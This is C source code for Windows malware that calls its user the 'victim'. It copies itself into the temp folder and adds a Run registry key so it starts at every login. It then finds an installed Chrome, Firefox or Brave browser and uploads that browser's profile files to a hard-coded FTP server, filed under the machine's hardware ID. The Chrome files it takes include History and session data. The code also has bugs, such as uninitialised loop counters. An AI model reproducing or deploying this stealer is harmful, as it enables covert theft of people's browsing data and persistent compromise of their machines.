#include <stdio.h>
#include <tchar.h>
#include <windows.h>
#include <wininet.h>
//add feature that checks if history file is less than 5 bytes, if it is reset & look at the other browser
//uses all windows data types

int main() {
	//copies file to %TMP%\ursakta.exe & adds reg key to execute
	//ursakta.exe on each login
	TCHAR tmp[MAX_PATH];
	GetEnvironmentVariable("TEMP", tmp, MAX_PATH); 
	strcat_s(tmp, strlen(tmp)+strlen("\\ursakta.exe")+1, "\\ursakta.exe");
	TCHAR ogfile[MAX_PATH];
	GetModuleFileNameA(NULL, ogfile, MAX_PATH);
	int cfreturn = CopyFile(ogfile, tmp, FALSE);
	if (cfreturn != 0) {
		printf("Success in copying!\n");
	}
	else {
		printf("fail\n");
	}
	LPCTSTR subkey = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
	HKEY hkey = NULL;
	LPCTSTR keyname = TEXT("Ursakta");
	LONG cstat = RegCreateKey(HKEY_CURRENT_USER, subkey, &hkey);
	LONG sstat = RegSetValueEx(hkey, keyname, 0, REG_SZ, (LPBYTE)tmp, _tcslen(tmp) * sizeof(TCHAR));
	//DWORD vcheck = 0;
	PCHAR vbrowser = "n";
	//char *vbrowser;
	const PCHAR browsers[] = {"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe", "C:\\Program Files (x86)\\Mozilla Firefox\\Firefox.exe", "C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"};
	//checks if victim has browser, adds browser path to vbrowser
	for (int i; i <= 2; i++){
		if (GetFileVersionInfoSizeA(browsers[i], NULL) != 0) {
			vbrowser = browsers[i];
			break;
		}
	}
	
	if (vbrowser == browsers[0]) {
		PCHAR path = getenv("USERPROFILE");
		PCHAR bpath = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\";
		HW_PROFILE_INFO uvid;
		WIN32_FIND_DATA location;
		GetCurrentHwProfileA(&uvid);
		strcat_s(path, strlen(path)+strlen(bpath)+1, bpath);
		SetCurrentDirectoryA(path);
		const PCHAR files[] = {"History", "Last Session", "Last Tabs", "Preferences"};
		HINTERNET initial = InternetOpenA("ursakta", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
		HINTERNET ftp = InternetConnectA(initial, "192.168.1.220", INTERNET_DEFAULT_FTP_PORT, "ftpsecure", "ftpsecure", INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
		if (FtpSetCurrentDirectoryA(ftp, uvid.szHwProfileGuid) == 0) {
			FtpCreateDirectoryA(ftp, uvid.szHwProfileGuid);
			FtpSetCurrentDirectoryA(ftp, uvid.szHwProfileGuid);
		}
		for (int i; i<=3; i++) {
			FindFirstFileA(files[i], &location);
			FtpPutFileA(ftp, location.cFileName, location.cFileName, FTP_TRANSFER_TYPE_BINARY, 0);
		}
	} else if (vbrowser == browsers[1]) {
		PCHAR path = getenv("APPDATA");
		PCHAR bpath = "\\Mozilla\\Firefox\\Profiles";
		strcat_s(path, strlen(path)+strlen(bpath)+1, bpath);
		CHAR currentdir[250];		
		//char currentdir[250];
		//char *pathext = "\\*";
		CHAR *pathext = "\\*";
		WIN32_FIND_DATA location;
		HW_PROFILE_INFO uvid;

		SetCurrentDirectoryA(path);
		GetCurrentDirectoryA(150, currentdir);
		strcat_s(currentdir, strlen(currentdir)+strlen(pathext)+1, pathext);
		GetCurrentHwProfileA(&uvid);
		HINTERNET initial = InternetOpenA("ursakta", INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
		HINTERNET ftp = InternetConnectA(initial, "192.168.1.220", INTERNET_DEFAULT_FTP_PORT, "ftpsecure", "ftpsecure", INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
		if (FtpSetCurrentDirectory(ftp, uvid.szHwProfileGuid) == 0){
			FtpCreateDirectoryA(ftp, uvid.szHwProfileGuid);
			FtpSetCurrentDirectory(ftp, uvid.szHwProfileGuid);
		}
		HANDLE filefinder1 = FindFirstFileA(currentdir, &location);
		if (filefinder1 != INVALID_HANDLE_VALUE){
			//avoiding .. & .. files
			FindNextFile(filefinder1, &location);
		
			FindNextFile(filefinder1, &location);
			SetCurrentDirectoryA(location.cFileName);
			GetCurrentDirectoryA(150, currentdir);
			strcat_s(currentdir, strlen(currentdir)+strlen(pathext)+1, pathext);
			HANDLE filefinder2 = FindFirstFileA(currentdir, &location);
			do {
				FtpPutFileA(ftp, location.cFileName, location.cFileName, FTP_TRANSFER_TYPE_BINARY, 0);
			} while (FindNextFile(filefinder2, &location));
		} else {
			printf("Invalid file handle on FindFirstFile!\n");
		}

	} else if (vbrowser == browsers[2]) {
		PCHAR path = getenv("USERPROFILE");
		PCHAR bpath = "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default";
		strcat_s(path, strlen(path)+strlen(bpath)+1, bpath);
		CHAR currentdir[250];
		CHAR pathext[] = "\\*";
		//char currentdir[250];
		const PCHAR folders[] = {"Session Storage", "AutofillStrikeDatabase", "GPUCache"};	
		//char *pathext = "\\*";
		WIN32_FIND_DATA location;
		HW_PROFILE_INFO uvid;

		SetCurrentDirectoryA(path);
		GetCurrentDirectoryA(150, currentdir);
		strcat_s(currentdir, strlen(currentdir)+strlen(pathext)+1, pathext);
		GetCurrentHwProfileA(&uvid);
		HINTERNET initial = InternetOpenA("ursakta", INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
		HINTERNET ftp = InternetConnectA(initial, "192.168.1.220", INTERNET_DEFAULT_FTP_PORT, "ftpsecure", "ftpsecure", INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
		if (FtpSetCurrentDirectory(ftp, uvid.szHwProfileGuid) == 0){
			FtpCreateDirectoryA(ftp, uvid.szHwProfileGuid);
			FtpSetCurrentDirectory(ftp, uvid.szHwProfileGuid);
		}
		//char ftphomedir[100];
		CHAR ftphomedir[100];		
		DWORD charcnt;
		FtpGetCurrentDirectoryA(ftp, ftphomedir, &charcnt);
		for (int i; i<=2; i++) {
			if (FtpSetCurrentDirectory(ftp, folders[i]) == 0) {
				FtpCreateDirectoryA(ftp, folders[i]);
			} else {
				FtpSetCurrentDirectoryA(ftp, ftphomedir);
			}
		}
		
		HANDLE filefinder1 = FindFirstFileA(currentdir, &location);
		if (filefinder1 != INVALID_HANDLE_VALUE){
			//avoiding .. & .. files
			FindNextFile(filefinder1, &location);
			FindNextFile(filefinder1, &location);
			SetCurrentDirectoryA(location.cFileName);
			GetCurrentDirectoryA(150, currentdir);
			strcat_s(currentdir, strlen(currentdir)+strlen(pathext)+1, pathext);
			HANDLE filefinder2 = FindFirstFileA(currentdir, &location);
			do {
				FtpPutFileA(ftp, location.cFileName, location.cFileName, FTP_TRANSFER_TYPE_BINARY, 0);
			} while (FindNextFile(filefinder2, &location));
		}

	} else {
		MessageBox(0, "LUCK!", "You are luck!", MB_OK);
	}

}
